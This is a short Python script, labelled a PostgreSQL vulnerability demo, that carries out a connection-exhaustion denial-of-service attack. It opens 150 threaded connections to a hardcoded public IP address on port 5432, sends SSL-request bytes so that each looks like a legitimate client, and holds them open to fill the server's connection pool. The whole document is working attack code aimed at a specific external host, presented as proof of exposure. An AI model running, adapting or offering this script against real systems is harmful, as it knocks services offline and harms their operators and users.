import socket
import threading
import time
import sys

TARGET_IP = "79.137.248.131"
TARGET_PORT = 5432
CONNECTION_COUNT = 150  # Enough to choke default config (usually 100)

connections = []

def hold_connection(i):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(10)
        s.connect((TARGET_IP, TARGET_PORT))
        
        # Send SSL Request (Magic Bytes) to look like a legit client starting handshake
        s.sendall(b'\x00\x00\x00\x08\x04\xd2\x16\x2f') 
        
        connections.append(s)
        # print(f"\r[*] Connection {i} established.", end="")
        
        # Keep alive loop
        while True:
            time.sleep(5)
            s.send(b'\x00') 
    except Exception as e:
        pass

print(f"--- POSTGRES VULNERABILITY DEMO (DoS) ---")
print(f"Target: {TARGET_IP}:{TARGET_PORT}")
print("[*] Filling connection pool to prove exposure...")

threads = []
for i in range(CONNECTION_COUNT):
    t = threading.Thread(target=hold_connection, args=(i,))
    t.daemon = True
    t.start()
    threads.append(t)
    time.sleep(0.02)
    sys.stdout.write(f"\r[*] Connections: {i+1}/{CONNECTION_COUNT}")
    sys.stdout.flush()

print("\n[*] Pool filled. Holding for 10 seconds to demonstrate denial of service...")
time.sleep(10)

print("\n[*] Test complete. Releasing connections.")
for s in connections:
    try: s.close()
    except: pass
